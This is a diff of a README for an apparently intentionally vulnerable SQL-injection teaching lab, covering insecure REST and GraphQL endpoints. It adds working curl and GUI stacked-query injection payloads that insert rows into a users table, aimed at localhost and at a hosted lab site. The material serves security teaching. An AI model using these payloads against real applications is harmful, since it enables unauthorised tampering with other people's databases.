@@ -28,7 +28,7 @@ docker run --rm -it --platform linux/amd64 --env-file .env -p 5001:5001 ghcr.io/
 Connect to the containerised Postgres instance:
 
 ```bash
-docker exec -it sqlinj-db psql -U sql_lab_user -d sqlinjproject
+docker exec -it sqlinj-db psql -U sql_lab_user -d devseclab
 ```
 
 Useful psql commands:
@@ -115,63 +115,99 @@ GraphiQL playground: `http://localhost:5001/graphql-insecure`
 
 ## SQL Injection Exploit Examples
 
-## Exploiting Anonymous Insecure REST Pages
+### Exploiting Anonymous Insecure REST Pages
 Note: Ensure that the cloth that you are adding is not assigned to user as duplicate key error will be returned
 
-Add Cloth exploit via Curl/Postman
-```
+#### REST API exploit of Add  Cloth exploit via Curl/Postman
+
+Make sure the actual userid exist but its clothid does not exist when demo this exploit 
+
+```bash
 curl -s -X POST http://localhost:5001/api/insecure-users/clothes \
   -H "Content-Type: application/json" \
-  -d '{"userid":"5","clothid":"9); INSERT INTO users(name,surname) VALUES('"'"'Alex'"'"','"'"'Injected'"'"'); --"}'
+  -d '{"userid":"5","clothid":"9); INSERT INTO users(name,surname) VALUES('"'"'Alex'"'"','"'"'Injected ADD REST Curl'"'"'); --"}'
+
+curl -s -X POST https://lab.oznetsecure.com.au/api/insecure-users/clothes \
+  -H "Content-Type: application/json" \
+  -d '{"userid":"5","clothid":"9); INSERT INTO users(name,surname) VALUES('"'"'Alex'"'"','"'"'Injected ADD REST Curl'"'"'); --"}'
 ```
 
-Add Cloth exploit via GUI
+#### REST API exploit of Add Cloth exploit via GUI injection
 ```
 9); INSERT INTO users(name,surname) VALUES('Alex','Injected'); --
 ```
 
-Remove Cloth exploit via Curl/Postman
+#### REST API exploit of Remove Cloth exploit via Curl/Postman
+
+Make sure the actual userid and clothid exist when demo this exploit 
 ```
+When deployed locally
 curl -s -X POST http://localhost:5001/api/insecure-users/remove-cloth \
   -H "Content-Type: application/json" \
   -d '{"userid":"1","clothid":"1; INSERT INTO users(name,surname) VALUES('"'"'Alex'"'"','"'"'Injected'"'"'); --"}'
+
+curl -s -X POST https://lab.oznetsecure.com.au/api/insecure-users/remove-cloth \
+  -H "Content-Type: application/json" \
+  -d '{"userid":"1","clothid":"1; INSERT INTO users(name,surname) VALUES('"'"'Alex'"'"','"'"'Injected Remove REST Curl'"'"'); --"}'
+
 ```
 
-Remove Cloth exploit via GUI
+
+#### REST API exploit of Remove Cloth exploit via GUI
 ```
-1; INSERT INTO users(name,surname) VALUES('Alex','Injected'); --
+1; INSERT INTO users(name,surname) VALUES('Alex','Injected Remove REST GUI'); --
 ```
 
-## Exploiting Insecure GraphQL Page
+
+
+### Exploiting Insecure GraphQL Page
 Note: addInsecureCloth clothid is string context (wrapped in `'...'` in SQL) — the only string-context parameter in the app, break with `'`
 
-Add Cloth exploit via Curl/Postman
+#### GraphQL Add Cloth exploit via Curl/Postman
+```text
+Note: In the example that exploits the add cloth grpahql api, make sure that userid=5 and clothid=9 do not exist, otherwise duplicate value will be reported. 
 ```
+
+```bash
 curl -s -X POST http://localhost:5001/graphql-insecure \
   -H "Content-Type: application/json" \
   -d '{"query":"mutation { addInsecureCloth(userid: 5, clothid: \"9'"'"'); INSERT INTO users(name,surname) VALUES('"'"'Alex'"'"','"'"'Injected'"'"'); --\") }"}'
+
+curl -s -X POST https://lab.oznetsecure.com.au/graphql-insecure \
+  -H "Content-Type: application/json" \
+  -d '{"query":"mutation { addInsecureCloth(userid: 5, clothid: \"9'"'"'); INSERT INTO users(name,surname) VALUES('"'"'Alex'"'"','"'"'Injected GrapQL Add Curl'"'"'); --\") }"}'
 ```
 
-Add Cloth exploit via GUI
+#### GraphQL Add Cloth exploit via GUI
 ```
-9'); INSERT INTO users(name,surname) VALUES('Alex','Injected'); --
+Foe example for userid, that doesn't have clothid 9:
+
+9'); INSERT INTO users(name,surname) VALUES('Alex','Injected GrapQL Add GUI'); --
+
 ```
 
-Remove Cloth exploit via Curl/Postman
+#### GraphQL Remove Cloth exploit via Curl/Postman
+
+Make sure that when removing cloth the actuall userid and clothid exist
 ```
 curl -s -X POST http://localhost:5001/graphql-insecure \
   -H "Content-Type: application/json" \
   -d '{"query":"mutation { removeInsecureCloth(userid: 1, clothid: \"1; INSERT INTO users(name,surname) VALUES('"'"'Alex'"'"','"'"'Injected'"'"'); --\") }"}'
+
+curl -s -X POST https://lab.oznetsecure.com.au/graphql-insecure \
+  -H "Content-Type: application/json" \
+  -d '{"query":"mutation { removeInsecureCloth(userid: 1, clothid: \"1; INSERT INTO users(name,surname) VALUES('"'"'Alex'"'"','"'"'Injected GraphQL Remove Curl'"'"'); --\") }"}'
+
 ```
 
-Remove Cloth exploit via GUI
+#### GraphQL Remove Cloth exploit via GUI
 ```
-1; INSERT INTO users(name,surname) VALUES('Alex','Injected'); --
+1; INSERT INTO users(name,surname) VALUES('Alex','Injected GraphQL Remove GUI'); --
 ```
 
-Verify
+#### Verify
 ```
-docker exec -it sqlinj-db psql -U sql_lab_user -d sqlinjproject \
+docker exec -it sqlinj-db psql -U sql_lab_user -d devseclab \
   -c "SELECT * FROM users ORDER BY userid;"
 ```
 
@@ -179,7 +215,7 @@ Reset: `docker compose down -v && docker compose up -d`
 
 ---
 
-## Detailed Exploit Reference
+### Detailed Exploit Reference
 
 ### 1 — Boolean-based (widen WHERE result set)
 
